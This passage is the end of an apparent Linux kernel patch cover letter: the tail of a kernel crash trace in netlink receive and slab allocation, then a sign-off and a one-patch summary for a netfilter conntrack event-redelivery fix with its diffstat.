[ 1955.163028][T12135]  ? __sys_recvfrom+0x1a1/0x2a0
[ 1955.163444][T12135]  ? __x64_sys_recvfrom+0xe0/0x1c0
[ 1955.163890][T12135]  new_slab+0x303/0x420
[ 1955.164232][T12135]  ___slab_alloc+0xe60/0x19e0
[ 1955.164660][T12135]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1955.165167][T12135]  ? __alloc_skb+0x114/0x2e0
[ 1955.165484][T12135]  ? __print_lock_name+0x1d1/0x260
[ 1955.165836][T12135]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1955.166280][T12135]  ? __alloc_skb+0x114/0x2e0
[ 1955.166703][T12135]  ? __slab_alloc.isra.0+0x5b/0xb0
[ 1955.167183][T12135]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1955.167625][T12135]  __slab_alloc.isra.0+0x5b/0xb0
[ 1955.168069][T12135]  __kmalloc_node_track_caller_noprof+0x322/0x430
[ 1955.168561][T12135]  ? __alloc_skb+0x114/0x2e0
[ 1955.168903][T12135]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1955.169306][T12135]  kmalloc_reserve+0xc0/0x240
[ 1955.169624][T12135]  ? __pfx___mutex_lock+0x10/0x10
[ 1955.169965][T12135]  __alloc_skb+0x114/0x2e0
[ 1955.170295][T12135]  ? __pfx___alloc_skb+0x10/0x10
[ 1955.170658][T12135]  netlink_dump+0x17a/0xc20
[ 1955.170981][T12135]  ? __pfx_netlink_dump+0x10/0x10
[ 1955.171365][T12135]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1955.171749][T12135]  ? kmem_cache_free+0x14d/0x4a0
[ 1955.172177][T12135]  ? netlink_recvmsg+0x526/0xd10
[ 1955.172648][T12135]  netlink_recvmsg+0x973/0xd10
[ 1955.173106][T12135]  ? __pfx_netlink_recvmsg+0x10/0x10
[ 1955.173542][T12135]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1955.174078][T12135]  ? __pfx_aa_sk_perm+0x10/0x10
[ 1955.174507][T12135]  ? __pfx___lock_acquire+0x10/0x10
[ 1955.174880][T12135]  ? __pfx_netlink_recvmsg+0x10/0x10
[ 1955.175347][T12135]  sock_recvmsg+0x14d/0x190
[ 1955.175742][T12135]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1955.176117][T12135]  __sys_recvfrom+0x1a1/0x2a0
[ 1955.176530][T12135]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1955.177055][T12135]  ? __pfx___sys_recvfrom+0x10/0x10
[ 1955.177496][T12135]  ? __pfx_lock_release+0x10/0x10
[ 1955.177891][T12135]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1955.178405][T12135]  ? rcu_is_watching+0x12/0xc0
[ 1955.178849][T12135]  ? xfd_validate_state+0x28/0x130
[ 1955.179229][T12135]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1955.179609][T12135]  ? rcu_is_watching+0x12/0xc0
[ 1955.179939][T12135]  __x64_sys_recvfrom+0xe0/0x1c0
[ 1955.180288][T12135]  ? do_syscall_64+0x93/0x270
[ 1955.180599][T12135]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1955.180963][T12135]  ? lockdep_hardirqs_on+0x7b/0x110
[ 1955.181319][T12135]  do_syscall_64+0xc7/0x270
[ 1955.181678][T12135]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[ 1955.182133][T12135] RIP: 0033:0x7f858ebae687
[ 1955.182498][T12135] Code: 48 89 fa 4c 89 df e8 58 b3 00 00 8b 93 08 03 00 00 59 5e 48 83 f8 fc 74 1a 5b c3 0f 1f 84 00 00 00 00 00 48 8b 44 24 10 0f 05 <5b> c3 0f 1f 80 00 00 00 00 83 e2 39 83 fa 08 75 de e8 23 ff ff ff
[ 1955.184377][T12135] RSP: 002b:00007ffeafa6ac80 EFLAGS: 00000202 ORIG_RAX: 000000000000002d
[ 1955.185177][T12135] RAX: ffffffffffffffda RBX: 00007f858eb1c740 RCX: 00007f858ebae687
[ 1955.185986][T12135] RDX: 0000000000004000 RSI: 00007ffeafa6bcf0 RDI: 0000000000000004
[ 1955.186783][T12135] RBP: 0000000000000004 R08: 0000000000000000 R09: 0000000000000000
[ 1955.187638][T12135] R10: 0000000000000000 R11: 0000000000000202 R12: 000000000000f02e
[ 1955.188408][T12135] R13: 0000000000000483 R14: 000000000000000f R15: 0000000000000001
[ 1955.189315][T12135]  </TASK>
[ 1955.189997][T12135] Kernel Offset: disabled
[ 1955.190412][T12135] Rebooting in 86400 seconds..


-----END crash log-----

Best regards,
Ruide Cao

Ruide Cao (1):
  netfilter: ecache: bound destroy event redelivery

 include/net/netfilter/nf_conntrack.h |  1 +
 net/netfilter/nf_conntrack_ecache.c  | 23 ++++++++++++++++++++++-
 2 files changed, 23 insertions(+), 1 deletion(-)


base-commit: 7b53449540502cb21b32bca62a6258e22cd97bbe
-- 
2.47.3
